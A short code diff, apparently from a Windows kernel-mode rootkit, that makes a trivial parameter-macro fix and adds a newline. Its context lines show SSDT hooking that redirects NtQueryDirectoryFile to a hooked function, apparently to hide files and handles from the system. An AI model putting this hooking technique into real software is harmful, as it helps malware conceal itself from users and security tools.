@@ -360,7 +360,7 @@ void __fastcall HideHandles_callback(unsigned long ssdt_index, void** ssdt_addre
 }
 
 void __fastcall HideFIles_callback(unsigned long ssdt_index, void** ssdt_address){
-    UNREFERENCED_PARAMETER(ssdt_address);
+    UNREFERENCED_PARAMETER(ssdt_index);
     if (*ssdt_address == g_QueryDir) *ssdt_address = HOOKED_NtQueryDirectoryFile;
 }
 
@@ -652,3 +652,4 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, 
     }
     return STATUS_SUCCESS;
 }
+
